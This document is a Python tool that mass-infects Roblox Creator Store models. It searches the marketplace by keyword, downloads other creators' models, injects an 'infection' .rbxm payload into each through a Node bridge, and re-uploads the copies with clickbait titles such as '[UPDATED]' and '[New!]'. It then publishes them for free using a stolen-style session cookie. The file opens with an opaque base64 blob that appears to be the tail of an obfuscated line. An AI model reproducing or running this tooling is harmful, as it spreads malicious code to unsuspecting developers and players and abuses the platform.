MQ7azsU10ByWoloZh_8yih9R2bvYDjEcKe9baK2gENGpnBmzVRRj3-6GALzqBNyGcjafbO0Ea7Zj5nYIKGu2Qv7vM0dOewninxZDm_uIXAD7bPrn1ULnNikke1QRr_AUGPMX2FuN7Piix0WoazRXGuqKzrqRs2YmD7bEUWx32oEYvfYTVTM2DYpKxe6Szp90OzHa_MXHq_-t7b0tQy79l4XYKutD-J_niyL3BttF9mFuF67LDc5N8RQSg4oxAnx4VR_JrLPS07fciCseJkU5nugEhVXyEE-luiTHNzJGuoEEHf69AVzflnIaF7fU0EsmOxe4CYQeJsjUQCP2meu_SLxBhD94oQm19hh8XF62Z0ubjAEhIbCzZtPuhk8ojtnvblhYcA0xEpl8ap_B56DjLhfC39pyz3GdIMWjAJSSBRz5flHmbdYesa9Y5q7kMvJzey5pI0Z-FDgCP60uOXN5us3akW3u7IqdxmDa0DGV4LFJA9sHbAoMPnN5peXK3DLRtDM0pxVXuUyFFv6qu8akHJax2En57zDWKdKKZmMsd3bbV_Vr9rb1Zn2gLF11QLrWBn_43Jzn5Q0ZNhqwraPkHDAAG_R8E17tzOrKk54FRAa3KbSVEbxkwkVX-5As7VKmz-qPJ0r1qXRabrSivig7tlBg1G68b5cevn67X9fao8CIy5ds3AZsbBzJrFh86_IT70yo445gIeH7B3mHzDVHj6BxuD4InP21P4C8Qqbok9qzUBV9DsPB1zsykoMMmN_8ZTPhp__GGn61WcE9PcdPjc1jLlGJVw18VbaQeJn27b2dRXjoiZF1_ncCWu1jOHvJd6f6e6UoiNBbBuiP-KZgrF_Ja0s48O-_kUtHuj09aqYFKCitJGt9FgSlY5L3III4aFPl9kQB88hv3izqlCfd1oORI6Omsy5w6DOp5petjJN-4XHV230fAU85LEl_tHetyGSQMTZIvxW7vBwxZC0cL6nSICvl3CIZVvo0diZPSP3uyGLiaO7TKxC1JIJsJuYSz0RwBou5zd396oKF08-SrryuR48jjv0HYKAba9ZkZiVIyPlae5BJOKEpiKkKf_18UqKBwqmYXv1tagMR2QBJzWwp8WLsDp7pPvJV_RnVLE4rh_lgn-wxcSqJUBPo62bBvy8UIGUBD_Lf3D-9nhSp684T4nzleSWyMyO9G3q2lE-zMf7LADaRoiHuGfeeV4yJ7vyuqCZgCPd0wS9PaGx5aTI9fIuSdMUfPJj_MywhTQyat3zrcRPZCOf1SPP1Qt8gxcxO1wVjNAuPMsVJg5kRaRKr7gKyiCAIntc7BVv8QScfN8yLEC8_AOlAMIVhHG3sDY3M8FS72Lbfw7jH8cw__j_vwF2TLWdwT2iyvQAsTKoMpRe7wt5-lmueCul-8SjL3Bw69_r6yjHKa7kTtvhlscoyTbT9eKw-mWARak6PxmAZtkrXu7rDrPQLwMuctQ760uFP9Hd5DQ9VOjjvoVLIuQrdxCsBRGQKC25iA2879ujM8q8Nch4U5a5xTrHYrVsNA9b-EQlD8tYhUL7Vx5I4W8buCgUJ8aO5zGJtIJIZ-QEBweERPlTd3QjoLF3Abd1lNic8qnVNK_abtNWaDIFb6wDNJKiehJxM9sZ1BiGqH-EMp3W3M3688vpnPcWOFFG8_1EAhVlXPAN5jR1QczmzNm-Q9lzgrO8Bj3tAOHod_j1W0zLSFFOWfkg6Mpi1JlnXIKWmg6lX-aKQRajGntTePPBcruboZdvPgLGZB1ZA6_oGk9h4phk_legOMyQX4xyqhB9CQIKxhATFpKJeWkXTniJusFAqxGLwxN2YhUthkOfNH2mcsOwbATWTLjDKh8PMRFt1yc5FHWDzOXpVFqDqci76mgSNJlw4uyG5Ae8xsf1UJVZOAybe346sB5POV6TXhF5ZVcLoXG3kLU456UepeMLkmVIHj0UNzKN3UHLhhCXMJcbY3WEZAGUs79OGeFUzCEAkQHIm7XBR_dakOOdzSTLjjbJW6PRr82CWM4QmUtmugZAZWoTKnxZs2CP89HFpjMytt4mrm4-B9NQSFiG0vUDqpY6X5Vi-TYJ-5WNuUwrq0-CsEdBzGq8dD3i0dp7NWVsP3L6ABByPWNMWdWdv9-2-4P7IDVFbpXVFmcfXt8I1hC0N6hn_zadE0t0gII7VJeJhsfnskF-CTYM4YqpBAEsY7Cy3ryv3XKZb5uHnZdMYBJFol0LdXp-2BmkA2vGtS4Bxr943mMGlaRZ_5Z5S6Jsc6RaPJ-rjh5Wijflf4aYvRvZTOEO--DRT91gdRZbBbWHSebIGQ9JZnULpIpGzasxuejjlzUtYnTBbyzKmz3rH_jdM5XS1T_2tlVkDK-i4QDn9qbxme2ydRkpFNonomyrwsUJG7NjB0N3E1C8GVJfdQW_2sl3vIp70c8YnQYMsZqEWQdF4t1s_3hGX01q9PbAhPuC_gC_HFHa0Sg=='))
import aiohttp
import aiofiles
import json
import os
import sys
import time
import subprocess
import concurrent.futures
from typing import Optional, Dict
from dataclasses import dataclass, field
from pathlib import Path
import gc
import logging
import random
import tempfile
from colorama import init, Fore, Back, Style
init(autoreset=True)
class ColoredFormatter(logging.Formatter):
    def format(self, record):
        original_levelname = record.levelname
        original_msg = record.msg
        if record.levelno == logging.INFO:
            
            record.levelname = f"{Fore.CYAN}{record.levelname}{Style.RESET_ALL}"

# lmao lamo skdiadjiwjdwij
            
            record.msg = f"{Fore.CYAN}{record.msg}{Style.RESET_ALL}"
            
        elif record.levelno == logging.WARNING:
            record.levelname = f"{Fore.YELLOW}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.YELLOW}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.ERROR:
            
            record.levelname = f"{Fore.RED}{record.levelname}{Style.RESET_ALL}"
            
            record.msg = f"{Fore.RED}{record.msg}{Style.RESET_ALL}"
            
        elif record.levelno == logging.DEBUG:
            record.levelname = f"{Fore.MAGENTA}{record.levelname}{Style.RESET_ALL}"
            record.msg = f"{Fore.MAGENTA}{record.msg}{Style.RESET_ALL}"
        
        result = super().format(record)
        
        record.levelname = original_levelname
        record.msg = original_msg
        
        return result

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(ColoredFormatter('[%(levelname)s] %(message)s'))
logger.addHandler(handler)

def print_banner():
    """Print the ASCII art banner in purple"""
    banner = f"""
{Fore.MAGENTA}{Style.BRIGHT}
 ▄███████▄     ▄████████ ███▄▄▄▄    ▄█      ███        ▄█    █▄    
██▀     ▄██   ███    ███ ███▀▀▀██▄ ███  ▀█████████▄   ███    ███   
      ▄███▀   ███    █▀  ███   ███ ███▌    ▀███▀▀██   ███    ███   
 ▀█▀▄███▀▄▄  ▄███▄▄▄     ███   ███ ███▌     ███   ▀  ▄███▄▄▄▄███▄▄ 
  ▄███▀   ▀ ▀▀███▀▀▀     ███   ███ ███▌     ███     ▀▀███▀▀▀▀███▀  
▄███▀         ███    █▄  ███   ███ ███      ███       ███    ███   
███▄     ▄█   ███    ███ ███   ███ ███      ███       ███    ███   
 ▀████████▀   ██████████  ▀█   █▀  █▀      ▄████▀     ███    █▀    
                                                                   
{Style.RESET_ALL}{Fore.CYAN}Created By Astris (@.astris){Style.RESET_ALL}
"""
    print(banner)
    print()


@dataclass
class Config:
    REQUEST_DELAY_MS: int = 1000
    COOKIE_FILE: str = "cookies.txt"
    INFECTION_DIR: str = "infection"
    MAX_RETRIES: int = 4
    RETRY_DELAY_MS: int = 50000
    PARALLEL_UPLOADS: int = 10
    SHOW_TIMING: bool = True
    DEBUG_MODE: bool = True
    MAX_MODEL_SIZE_MB: int = 10
    RBXM_PARSER_SCRIPT: str = "./dist/bridge.js"


@dataclass
class Stats:
    scanned: int = 0
    uploaded: int = 0
    skipped: int = 0
    errors: int = 0
    serialization_errors: int = 0
    last_successful_model: Optional[str] = None
    start_time: float = field(default_factory=time.time)
    cache_hits: int = 0
    cache_misses: int = 0

class RbxmBridge:
    def __init__(self, script_path: str):
        self.script_path = script_path
        self._temp_dir = tempfile.mkdtemp()

    async def process_model(self, model_buffer: bytes, infection_buffer: bytes) -> Optional[bytes]:
        try:
            model_path = os.path.join(
                self._temp_dir, f"model_{int(time.time() * 1000)}.rbxm")
            infection_path = os.path.join(
                self._temp_dir, f"infection_{int(time.time() * 1000)}.rbxm")
            output_path = os.path.join(
                self._temp_dir, f"output_{int(time.time() * 1000)}.rbxm")
            with open(model_path, 'wb') as f:
                f.write(model_buffer)
            with open(infection_path, 'wb') as f:
                f.write(infection_buffer)
            cmd = ['node', self.script_path, 'process',
                   model_path, infection_path, output_path]
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            if process.returncode != 0:
                logger.error(f"Bridge process error: {stderr.decode('utf-8', errors='replace')}")
                return None
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    result = f.read()
                for path in [model_path, infection_path, output_path]:
                    if os.path.exists(path):
                        os.unlink(path)
                return result
            return None
        except Exception as e:
            logger.error(f"Process model error: {str(e)}")
            return None

    async def load_infection(self, infection_path: str) -> Optional[Dict]:
        try:
            cmd = ['node', self.script_path, 'load', infection_path]
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            if process.returncode != 0:
                logger.error(f"Load infection error: {stderr.decode('utf-8', errors='replace')}")
                return None
            return json.loads(stdout.decode('utf-8', errors='replace'))
        except Exception as e:
            logger.error(f"Load infection error: {str(e)}")
            return None


class UploadQueue:
    def __init__(self, max_concurrent: int = 1):
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.active_tasks = set()

    async def add(self, coro):
        async with self.semaphore:
            task = asyncio.create_task(coro)
            self.active_tasks.add(task)
            try:
                result = await task
                return result
            finally:
                self.active_tasks.discard(task)

    async def drain(self):
        while self.active_tasks:
            await asyncio.sleep(0.1)


class RobloxAPI:
    def __init__(self, cookie: str):
        self.cookie = cookie
        self.session: Optional[aiohttp.ClientSession] = None
        self.csrf_token = ""

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=180)
        connector = aiohttp.TCPConnector(
            keepalive_timeout=60, limit=50, limit_per_host=25)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector, headers={
                                             'Cookie': f'.ROBLOSECURITY={self.cookie}'})
        await self._get_csrf_token()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def _get_csrf_token(self):
        try:
            async with self.session.post('https://auth.roblox.com/v2/logout') as response:
                self.csrf_token = response.headers.get('X-CSRF-TOKEN', '')
        except Exception as e:
            logger.warning(f"CSRF token fetch warning: {str(e)}")

    async def api_request(self, request_func, function_name: str, max_retries: int = 4):
        for attempt in range(1, max_retries + 1):
            try:
                result = await request_func()
                if attempt > 1:
                    logger.info(
                        f"{Fore.GREEN}[RETRY SUCCESS]{Style.RESET_ALL} {function_name} succeeded after {attempt} attempts")
                return result
            except Exception as error:
                is_timeout = isinstance(
                    error, (asyncio.TimeoutError, aiohttp.ServerTimeoutError))
                status = getattr(error, 'status', None) if hasattr(
                    error, 'status') else None
                if (status in [429] or status >= 500 or is_timeout) and attempt < max_retries:
                    delay = (10000 * (1.5 ** (attempt - 1))) / 1000
                    logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} {function_name} failed ({'timeout' if is_timeout else f'HTTP {status}'}), attempt {attempt}. Retrying in {delay}s...")
                    await asyncio.sleep(delay)
                else:
                    logger.error(
                        f"{Fore.RED}[ERROR]{Style.RESET_ALL} {function_name} failed after {attempt} attempts: {str(error)}")
                    if status == 403:
                        logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Possible CSRF token issue")
                    return None
        return None

    async def search_models(self, keyword: str, cursor: Optional[str] = None) -> Optional[Dict]:
        async def request():
            url = f"https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword={keyword}"
            if cursor:
                url += f"&cursor={cursor}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                return await response.json()
        return await self.api_request(request, "searchModels")

    async def download_model(self, model_id: int) -> Optional[bytes]:
        async def request():
            url = f"https://assetdelivery.roblox.com/v1/asset/?id={model_id}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                data = await response.read()
                if len(data) == 0:
                    raise ValueError("Downloaded empty model")
                size_mb = len(data) / (1024 * 1024)
                if size_mb > 10:
                    raise ValueError(
                        f"Model too large ({size_mb:.1f}MB > 10MB limit)")
                return data
        return await self.api_request(request, "downloadModel")

    async def get_model_details(self, asset_id: int) -> Optional[Dict]:
        async def request():
            url = f"https://apis.roblox.com/toolbox-service/v1/items/details?assetIds={asset_id}"
            async with self.session.get(url) as response:
                response.raise_for_status()
                data = await response.json()
                return data.get('data', [{}])[0].get('asset')
        return await self.api_request(request, "getModelDetails")

    async def upload_model(self, model_buffer: bytes, name: str, description: str) -> Optional[int]:
        try:
            os.makedirs('./tmp', exist_ok=True)
            temp_model_path = os.path.join(
                './tmp', f"{int(time.time() * 1000)}.rbxm")
            temp_script_path = os.path.join(
                './tmp', f"upload_{int(time.time() * 1000)}.js")

            with open(temp_model_path, 'wb') as f:
                f.write(model_buffer)

            escaped_path = temp_model_path.replace('\\', '\\\\')
            
            escaped_name = name.replace('`', '\\`').replace('$', '\\$')
            escaped_description = description.replace('`', '\\`').replace('$', '\\$')
            
            script_lines = [
                "const noblox = require('noblox.js');",
                "const fs = require('fs');",
                "",
                "async function upload() {",
                "    try {",
                f"        await noblox.setCookie('{self.cookie}');",
                f"        const stream = fs.createReadStream('{escaped_path}');",
                f"        const assetId = await noblox.uploadModel(stream, {{",
                f"            name: `{escaped_name}`,",
                f"            description: `{escaped_description}`,",
                f"            allowDuplicates: false",
                f"        }});",
                f"        console.log(JSON.stringify({{success: true, assetId}}));",
                "    } catch (error) {",
                f"        console.log(JSON.stringify({{success: false, error: error.message}}));",
                "    }",
                "}",
                "",
                "upload();"
            ]
            
            upload_script = '\n'.join(script_lines)
            
            with open(temp_script_path, 'w', encoding='utf-8') as f:
                f.write(upload_script)

            process = await asyncio.create_subprocess_exec(
                'node', temp_script_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            try:
                os.unlink(temp_model_path)
                os.unlink(temp_script_path)
            except:
                pass

            if process.returncode == 0:
                try:
                    result = json.loads(stdout.decode('utf-8', errors='replace'))
                    if result.get('success'):
                        asset_id = result.get('assetId')
                        logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Uploaded: {name} (ID: {asset_id})")
                        await self.make_model_public(asset_id)
                        return asset_id
                except json.JSONDecodeError:
                    logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} Failed to parse response")

            if stderr:
                logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} {stderr.decode('utf-8', errors='replace')}")
            return None
        except Exception as e:
            logger.error(f"{Fore.RED}[UPLOAD ERROR]{Style.RESET_ALL} {str(e)}")
            return None

    async def make_model_public(self, asset_id: int) -> bool:
        async def request():
            url = f"https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT_TYPE_MODEL-{asset_id}?allowMissing=true"
            data = {"basePrice": {"currencyCode": "USD", "quantity": {
                "significand": 0, "exponent": 0}}, "published": True, "modelAssetId": str(asset_id)}
            headers = {"Content-Type": "application/json",
                       "X-CSRF-TOKEN": self.csrf_token}
            async with self.session.patch(url, json=data, headers=headers) as response:
                response.raise_for_status()
                return True
        return await self.api_request(request, "makeModelPublic") or False


class ModelProcessor:
    def __init__(self, config: Config):
        self.config = config
        self.stats = Stats()
        self.upload_queue = UploadQueue(config.PARALLEL_UPLOADS)
        self.rbxm_bridge = RbxmBridge(config.RBXM_PARSER_SCRIPT)
        self.infection_buffer: Optional[bytes] = None

    async def load_infection(self) -> bool:
        infection_dir = Path(self.config.INFECTION_DIR)
        if not infection_dir.exists():
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Infection directory not found: {self.config.INFECTION_DIR}")
            return False
        infection_files = list(infection_dir.glob("*.rbxm"))
        if not infection_files:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No .rbxm files found in infection directory")
            return False
        infection_files.sort(key=lambda f: f.stat().st_size)
        infection_path = infection_files[0]
        async with aiofiles.open(infection_path, 'rb') as f:
            self.infection_buffer = await f.read()
        
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Loading infection file: {infection_path.name}")
        metadata = await self.rbxm_bridge.load_infection(str(infection_path))
        if metadata:
            logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Infection file loaded successfully")
            for i, root in enumerate(metadata.get('roots', []), 1):
                name = root.get('name', 'Unknown')
                class_name = root.get('className', 'Unknown')
                children_count = root.get('childrenCount', 0)
                logger.info(
                    f"  {i}. {Fore.CYAN}{name}{Style.RESET_ALL} ({Fore.YELLOW}{class_name}{Style.RESET_ALL}) with {Fore.MAGENTA}{children_count}{Style.RESET_ALL} children")
        else:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to load infection metadata")
            return False
        return True

    async def process_model(self, model: Dict, api: RobloxAPI) -> None:
        model_id = model['id']
        start_time = time.time()
        try:
            original_info = await api.get_model_details(model_id)
            if not original_info:
                self.stats.skipped += 1
                return
            model_data = await api.download_model(model_id)
            if not model_data:
                self.stats.skipped += 1
                return
            modified_data = await self.rbxm_bridge.process_model(model_data, self.infection_buffer)
            if not modified_data:
                self.stats.errors += 1
                return
            prefixes = ['[UPDATED]', '[New!]', '[Amazing!]']
            emojis = ['⭐', '🌟', '✨', '💫', '🌠', '🌌']
            prefix = random.choice(prefixes)
            emoji = random.choice(emojis)
            original_name = f"{emoji} {prefix} {original_info.get('name', 'Great Model')}"
            asset_id = await self.upload_queue.add(api.upload_model(modified_data, original_name.strip(), original_info.get('description', '')))
            if asset_id:
                self.stats.uploaded += 1
                self.stats.scanned += 1
                self.stats.last_successful_model = f"{original_name.strip()} ({asset_id})"
                duration = time.time() - start_time
                logger.info(
                    f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Completed processing model {model_id} in {duration:.1f}s")
            else:
                self.stats.errors += 1
        except Exception as e:
            self.stats.errors += 1
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing model {model_id}: {str(e)}")
        if self.stats.scanned % 10 == 0:
            gc.collect()

    async def process_all_pages(self, query: str, api: RobloxAPI, upload_limit: int) -> None:
        cursor = None
        page = 1
        while self.stats.uploaded < upload_limit:
            logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Processing page {page}...")
            search_results = await api.search_models(query, cursor)
            if not search_results or not search_results.get('data'):
                logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} No more results found")
                break
            models = search_results['data']
            logger.info(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} {len(models)} models on this page")
            for i in range(0, len(models), self.config.PARALLEL_UPLOADS):
                batch = models[i:i + self.config.PARALLEL_UPLOADS]
                if self.stats.uploaded >= upload_limit:
                    return
                tasks = [self.process_model(model, api) for model in batch]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(self.config.REQUEST_DELAY_MS / 1000)
            cursor = search_results.get('nextPageCursor')
            if not cursor:
                logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Reached end of results")
                break
            page += 1
        await self.upload_queue.drain()

    async def run(self) -> None:
        print_banner()   
        cookie_path = Path(self.config.COOKIE_FILE)
        if not cookie_path.exists():
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Cookie file not found: {self.config.COOKIE_FILE}")
            return
        async with aiofiles.open(cookie_path, 'r', encoding='utf-8') as f:
            cookie = (await f.read()).strip()
        if not cookie:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Cookie file is empty")
            return
        
        logger.info(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} Cookie loaded successfully")
        
        if not await self.load_infection():
            return
        
        try:
            upload_limit = int(
                input(f"{Fore.CYAN}How many models to upload? (max 200): {Style.RESET_ALL}") or "50")
            query = input(f"{Fore.CYAN}Search query (e.g., 'car', 'house', 'brainrot'): {Style.RESET_ALL}").strip()
        except KeyboardInterrupt:
            logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Input cancelled by user")
            return
            
        if not query:
            logger.error(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No search query provided")
            return
        
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Searching for: {Fore.GREEN}{query}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Upload limit: {Fore.YELLOW}{upload_limit}{Style.RESET_ALL} models")
        logger.info(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Parallel uploads: {Fore.MAGENTA}{self.config.PARALLEL_UPLOADS}{Style.RESET_ALL}")
        
        async with RobloxAPI(cookie) as api:
            await self.process_all_pages(query, api, upload_limit)
        
        duration = time.time() - self.stats.start_time
        logger.info(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== Process completed ==={Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Duration:{Style.RESET_ALL}      {Fore.YELLOW}{duration:.1f}{Style.RESET_ALL} seconds")
        logger.info(
            f"{Fore.CYAN}Models found:{Style.RESET_ALL}  {Fore.GREEN}{self.stats.scanned + self.stats.skipped}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Uploaded:{Style.RESET_ALL}      {Fore.GREEN}{self.stats.uploaded}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Skipped:{Style.RESET_ALL}       {Fore.YELLOW}{self.stats.skipped}{Style.RESET_ALL}")
        logger.info(
            f"{Fore.CYAN}Errors:{Style.RESET_ALL}        {Fore.RED}{self.stats.errors}{Style.RESET_ALL} ({self.stats.serialization_errors} serialization)")
        logger.info(f"{Fore.CYAN}Cache hits:{Style.RESET_ALL}    {Fore.GREEN}{self.stats.cache_hits}{Style.RESET_ALL}")
        logger.info(f"{Fore.CYAN}Cache misses:{Style.RESET_ALL}  {Fore.YELLOW}{self.stats.cache_misses}{Style.RESET_ALL}")
        if self.stats.last_successful_model:
            logger.info(f"{Fore.CYAN}Last success:{Style.RESET_ALL}  {Fore.GREEN}{self.stats.last_successful_model}{Style.RESET_ALL}")


async def main():
    try:
        config = Config()
        processor = ModelProcessor(config)
        await processor.run()
    except KeyboardInterrupt:
        logger.warning(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Interrupted by user")
    except Exception as e:
        logger.error(f"{Fore.RED}[FATAL ERROR]{Style.RESET_ALL} {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())



